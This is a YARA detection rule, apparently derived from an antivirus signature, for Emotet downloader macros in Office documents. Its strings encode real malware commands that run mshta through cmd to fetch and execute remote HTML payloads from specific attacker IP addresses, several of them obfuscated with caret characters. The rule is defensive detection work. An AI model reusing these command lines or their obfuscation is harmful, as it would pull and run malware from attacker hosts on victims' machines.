
rule TrojanDownloader_O97M_Emotet_RVB_MTB{
	meta:
		description = "TrojanDownloader:O97M/Emotet.RVB!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 0a 00 00 01 00 "
		
	strings :
		$a_01_0 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 31 38 35 2e 37 2e 32 31 34 2e 37 2f 76 65 2f 76 65 2e 68 74 6d 6c } //01 00  cmd /c m^sh^t^a h^tt^p^:/^/185.7.214.7/ve/ve.html
		$a_01_1 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 30 78 62 39 30 37 64 36 30 37 2f 66 65 72 2f 66 65 33 2e 68 74 6d 6c } //01 00  cmd /c m^sh^t^a h^tt^p^:/^/0xb907d607/fer/fe3.html
		$a_01_2 = {6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 30 78 35 63 66 66 33 39 63 33 2f 73 65 63 2f 73 65 33 2e 68 74 6d 6c } //01 00  m^sh^t^a h^tt^p^:/^/0x5cff39c3/sec/se3.html
		$a_03_3 = {6d 73 5e 68 5e 74 61 20 68 74 5e 74 70 3a 2f 5e 2f 30 78 5e 62 5e 39 30 37 64 36 30 5e 37 2f 66 65 5e 72 2f 66 65 90 01 01 2e 68 74 6d 6c 90 00 } //01 00 
		$a_01_4 = {63 6d 64 20 2f 63 20 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 36 38 2f 71 71 77 2f 61 61 73 2f 73 65 2e 68 74 6d 6c } //01 00  cmd /c mshta http://91.240.118.168/qqw/aas/se.html
		$a_01_5 = {63 6d 64 20 2f 63 20 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 36 38 2f 7a 78 2f 63 76 2f 66 65 2e 68 74 6d 6c } //01 00  cmd /c mshta http://91.240.118.168/zx/cv/fe.html
		$a_01_6 = {63 6d 64 20 2f 63 20 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 36 38 2f 7a 7a 78 2f 63 63 76 2f 66 65 2e 68 74 6d 6c } //01 00  cmd /c mshta http://91.240.118.168/zzx/ccv/fe.html
		$a_01_7 = {6d 73 5e 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 5e 34 30 2e 31 31 38 2e 31 5e 36 38 2f 76 76 76 2f 70 70 70 2f 66 5e 65 2e 68 74 5e 6d 5e 6c } //01 00  ms^hta http://91.2^40.118.1^68/vvv/ppp/f^e.ht^m^l
		$a_01_8 = {6d 73 5e 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 5e 34 30 2e 31 31 38 2e 31 5e 36 38 2f 6f 6f 2f 61 61 2f 73 5e 65 2e 68 74 5e 6d 5e 6c } //01 00  ms^hta http://91.2^40.118.1^68/oo/aa/s^e.ht^m^l
		$a_01_9 = {6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 37 32 2f 68 68 2f 68 68 2e 68 74 6d 6c } //00 00  mshta http://91.240.118.172/hh/hh.html
	condition:
		any of ($a_*)
 
}